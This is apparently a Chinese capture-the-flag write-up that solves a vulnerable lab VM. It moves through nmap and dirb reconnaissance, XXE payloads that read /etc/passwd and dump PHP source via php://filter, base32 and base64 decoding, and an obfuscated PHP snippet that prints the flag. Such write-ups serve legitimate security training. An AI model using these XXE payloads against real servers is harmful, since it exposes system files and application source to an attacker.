VMware双击打开，nat模式运行即可！

XXE(XML External Entity Injection) XML外部实体注入，XML是一种类似于HTML（超文本标记语言）的可扩展标记语言，是用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。

--------------------------------------------
--------------------------------------------
1、nmap 192.168.253.0/24 -sP

Nmap scan report for localhost (192.168.253.150)
Host is up (0.0018s latency).


--------------------------------------------
--------------------------------------------
2、nmap 192.168.253.150 -p- -A

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.27 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/xxe/* /admin.php
|_http-server-header: Apache/2.4.27 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
5355/tcp open  llmnr?


--------------------------------------------
--------------------------------------------
3、web信息收集+爆破

访问80端口发现为Ubuntu默认页面，先对其进行目录扫描

dirb http://192.168.253.150/
http://192.168.253.150/robots.txt

访问发现：
User-Agent: *
Disallow: /xxe/*
Disallow: /admin.php


访问XXE目录发现有登录页面：
http://192.168.253.150/xxe/


F12浏览器network发现：
<?xml version="1.0" encoding="UTF-8"?><root><name>admin</name><password>admin</password></root>
查看发送请求发现POST数据为XML格式！


--------------------------------------------
--------------------------------------------
4、XXE利用

https://xz.aliyun.com/t/3357

随便谷歌或者百度：XXE payload  都能出现很多文章！
https://blog.csdn.net/qq1124794084/article/details/81742668


使用BurpSuite抓包，构造POC获取/etc/passwd文件，发现存在XXE漏洞：
-------------
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>

或者：
<!DOCTYPE r [ <!ELEMENT r ANY > <!ENTITY sp SYSTEM "file:///etc/passwd"> ]>
-------------

构造伪协议获取admin.php源代码，使用Base64编码防止php代码被执行：

-------------
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=admin.php">
]>
-------------
获得base64源码！

--------------------------------------------
--------------------------------------------
5、base64+base32+md5


$flag = "Here is the <a style='color:FF0000;' href='/flagmeout.php'>Flag</a>";
解码后发现falg在/flagmeout.php文件中，再次获取flagmeout.php文件源代码!

<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=flagmeout.php">

解码：
<?php
$flag = "<!-- the flag in (JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5) -->";
echo $flag;
?>

在flagmeout.php源代码中发现Base32编码的内容：https://www.qqxiuzi.cn/bianma/base.php

Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。
https://www.usetoolbar.com/developer/base32.html

base32 JQZFMMCZPE4HKWTNPBUFU6JVO5QUQQJ5



解码后发现是Base64：
base64 L2V0Yy8uZmxhZy5waHA=

最终获得：
/etc/.flag.php

<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/resource=/etc/.flag.php">

------------
<?php
$_[]++;$_[]=$_._;$_____=$_[(++$__[])][(++$__[])+(++$__[])+(++$__[])];$_=$_[$_[+_]];$___=$__=$_[++$__[]];$____=$_=$_[+_];$_++;$_++;$_++;$_=$____.++$___.$___.++$_.$__.++$___;$__=$_;$_=$_____;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$_++;$___=+_;$___.=$__;$___=++$_^$___[+_];$À=+_;$Á=$Â=$Ã=$Ä=$Æ=$È=$É=$Ê=$Ë=++$Á[];$Â++;$Ã++;$Ã++;$Ä++;$Ä++;$Ä++;$Æ++;$Æ++;$Æ++;$Æ++;$È++;$È++;$È++;$È++;$È++;$É++;$É++;$É++;$É++;$É++;$É++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ê++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$Ë++;$__('$_="'.$___.$Á.$Â.$Ã.$___.$Á.$À.$Á.$___.$Á.$À.$È.$___.$Á.$À.$Ã.$___.$Á.$Â.$Ã.$___.$Á.$Â.$À.$___.$Á.$É.$Ã.$___.$Á.$É.$À.$___.$Á.$É.$À.$___.$Á.$Ä.$Æ.$___.$Á.$Ã.$É.$___.$Á.$Æ.$Á.$___.$Á.$È.$Ã.$___.$Á.$Ã.$É.$___.$Á.$È.$Ã.$___.$Á.$Æ.$É.$___.$Á.$Ã.$É.$___.$Á.$Ä.$Æ.$___.$Á.$Ä.$Á.$___.$Á.$È.$Ã.$___.$Á.$É.$Á.$___.$Á.$É.$Æ.'"');$__($_);
?>
------------
添加<?php?>保存到文件进行运行，php版本不能太高，7.2以上就会报错！

Catchable fatal error: assert(): Failure evaluating code: SAFCSP{xxe_is_so_easy} in C:\phpStudy\WWW\flag.php on line 2

SAFCSP{xxe_is_so_easy}





























































































